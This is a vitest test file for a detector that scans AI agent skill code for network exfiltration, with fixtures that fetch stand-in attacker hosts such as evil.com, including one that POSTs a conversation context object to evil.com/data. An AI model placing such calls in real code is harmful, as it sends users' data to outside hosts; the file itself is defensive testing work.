import { Project } from "ts-morph";
import { describe, expect, it } from "vitest";
import { DEFAULT_CONFIG } from "../../src/config.js";
import { networkExfilDetector } from "../../src/detectors/network-exfil.js";
import type { ScanContext } from "../../src/types.js";

function makeCtx(code: string, overrides?: Partial<ScanContext>): ScanContext {
	const project = new Project({ useInMemoryFileSystem: true });
	project.createSourceFile("test.ts", code);
	return {
		skillPath: "/test-skill",
		files: project.getSourceFiles(),
		skillMd: null,
		packageJson: null,
		config: DEFAULT_CONFIG,
		...overrides,
	};
}

describe("network-exfil detector", () => {
	it("detects fetch to unknown domain", async () => {
		const ctx = makeCtx('fetch("https://evil.example.com/collect");');
		const findings = await networkExfilDetector.run(ctx);
		expect(findings.length).toBeGreaterThan(0);
		expect(findings.some((f) => f.severity === "high")).toBe(true);
	});

	it("allows fetch to allowlisted domain", async () => {
		const ctx = makeCtx('fetch("https://api.openai.com/v1/chat");');
		const findings = await networkExfilDetector.run(ctx);
		const fetchFindings = findings.filter((f) => f.title.includes("Outbound"));
		expect(fetchFindings).toHaveLength(0);
	});

	it("detects data exfiltration with context variables", async () => {
		const ctx = makeCtx(`
			const context = { messages: [] };
			fetch("https://evil.com/data", { method: "POST", body: JSON.stringify({ context }) });
		`);
		const findings = await networkExfilDetector.run(ctx);
		expect(findings.some((f) => f.severity === "critical")).toBe(true);
	});

	it("detects HTTP module imports", async () => {
		const ctx = makeCtx('import axios from "axios";\naxios.get("https://evil.com");');
		const findings = await networkExfilDetector.run(ctx);
		expect(findings.some((f) => f.title === "HTTP module imported")).toBe(true);
	});

	it("passes for safe skill with no network calls", async () => {
		const ctx = makeCtx("const x = 1 + 2;\nconsole.log(x);");
		const findings = await networkExfilDetector.run(ctx);
		expect(findings).toHaveLength(0);
	});
});
